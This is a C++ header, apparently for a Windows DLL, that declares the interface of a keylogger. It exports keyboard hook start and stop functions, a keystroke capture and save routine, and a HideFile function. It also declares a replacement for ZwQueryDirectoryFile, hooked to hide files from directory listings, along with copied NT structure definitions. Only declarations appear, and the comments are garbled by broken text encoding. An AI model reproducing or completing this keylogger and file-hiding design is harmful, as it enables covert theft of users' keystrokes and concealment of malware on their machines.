#pragma once
#include <windows.h>
#include <WinNT.h>
#include <atlstr.h>
#include <string>
using namespace std;
#pragma comment(lib,"imm32.lib")


//////////////////////////////////////////////////////////////////////////
//Ԥ�����                   
//////////////////////////////////////////////////////////////////////////
#define EXPORT __declspec(dllexport)
#define EXTERNC extern "C"
#define MAXLENGTH 1024*9



//////////////////////////////////////////////////////////////////////////
//ȫ�ֱ���
//////////////////////////////////////////////////////////////////////////
//extern HHOOK hHook;
//extern BOOL  flag;
//extern HWND  hLastWnd;
//extern HINSTANCE hInstance;
//extern char szText[MAXLENGTH];








//////////////////////////////////////////////////////////////////////////
//�����Զ��嵼������
//////////////////////////////////////////////////////////////////////////
//�������̼��
EXTERNC EXPORT HHOOK StartHook(void);
//�رռ��̼��
EXTERNC EXPORT BOOL StopHook(void);
//����ָ���ļ�
EXTERNC EXPORT BOOL HideFile(char* fname);
//��ȡ����
EXTERNC EXPORT char* GetText(void);
//���̹�������
EXPORT LRESULT  CALLBACK HookProc(int nCode,WPARAM wParam,LPARAM lParam);
//���Ͱ�����Ϣ
BOOL KeySave(char* szText);



//////////////////////////////////////////////////////////////////////////
//ʵ���ļ���������Ľṹ�嶨��
//////////////////////////////////////////////////////////////////////////


//��ntddk���ó�����һЩ�ṹ�嶨�壬��ZwQueryDirectoryFile()��Ҫ�õ�

typedef LONG NTSTATUS;
#define NT_SUCCESS(Status) ((NTSTATUS)(Status)>=0)
//��������
typedef struct _IO_STATUS_BLOCK 
{ 
	NTSTATUS  Status; 
	ULONG    Information; 
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK; 
//�ַ�������
typedef struct _UNICODE_STRING 
{ 
	USHORT    Length; 
	USHORT    MaximumLength; 
	PWSTR    Buffer; 
} UNICODE_STRING, *PUNICODE_STRING; 
//ö�����ͣ���Ҫ����FileBothDirectoryInformation
typedef enum _FILE_INFORMATION_CLASS {
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,
	FileBothDirectoryInformation,
	FileBasicInformation,
	FileStandardInformation,
	FileInternalInformation,
	FileEaInformation,
	FileAccessInformation,
	FileNameInformation,
	FileRenameInformation,
	FileLinkInformation,
	FileNamesInformation,
	FileDispositionInformation,
	FilePositionInformation,
	FileFullEaInformation,
	FileModeInformation,
	FileAlignmentInformation,
	FileAllInformation,
	FileAllocationInformation,
	FileEndOfFileInformation,
	FileAlternateNameInformation,
	FileStreamInformation,
	FilePipeInformation,
	FilePipeLocalInformation,
	FilePipeRemoteInformation,
	FileMailslotQueryInformation,
	FileMailslotSetInformation,
	FileCompressionInformation,
	FileObjectIdInformation,
	FileCompletionInformation,
	FileMoveClusterInformation,
	FileQuotaInformation,
	FileReparsePointInformation,
	FileNetworkOpenInformation,
	FileAttributeTagInformation,
	FileTrackingInformation,
	FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;


typedef VOID (NTAPI *PIO_APC_ROUTINE)(
									  IN PVOID ApcContext,
									  IN PIO_STATUS_BLOCK IoStatusBlock,
									  IN ULONG Reserved);

typedef struct _FILE_BOTH_DIRECTORY_INFORMATION { 
	ULONG NextEntryOffset;
	ULONG Unknown;
	LARGE_INTEGER CreationTime;
	LARGE_INTEGER LastAccessTime;
	LARGE_INTEGER LastWriteTime;
	LARGE_INTEGER ChangeTime;
	LARGE_INTEGER EndOfFile;
	LARGE_INTEGER AllocationSize;
	ULONG FileAttributes;
	ULONG FileNameLength;
	ULONG EaInformationLength;
	UCHAR AlternateNameLength;
	WCHAR AlternateName[12];
	WCHAR FileName[1];
} FILE_BOTH_DIRECTORY_INFORMATION,*PFILE_BOTH_DIRECTORY_INFORMATION;




typedef NTSTATUS ( __stdcall *ZWQUERYDIRECTORYFILE ) (
	IN  HANDLE FileHandle,
	IN  HANDLE Event OPTIONAL,
	IN  PIO_APC_ROUTINE ApcRoutine OPTIONAL,
	IN  PVOID ApcContext OPTIONAL,
	OUT PIO_STATUS_BLOCK IoStatusBlock,
	OUT PVOID FileInformation,
	IN  ULONG Length,
	IN  FILE_INFORMATION_CLASS FileInformationClass,
	IN  BOOLEAN ReturnSingleEntry,
	IN  PUNICODE_STRING FileName OPTIONAL,
	IN  BOOLEAN RestartScan
	);



//Hook Function
BOOL HookQueryFile(BOOL flag);
//�滻ԭ�к���
NTSTATUS WINAPI NewZwQueryDirectoryFile(HANDLE FileHandle,HANDLE Event,PIO_APC_ROUTINE ApcRoutine,PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,PVOID FileInformation,ULONG Length,FILE_INFORMATION_CLASS FileInformationClass,BOOLEAN ReturnSingleEntry,PUNICODE_STRING FileName,BOOLEAN RestartScan);
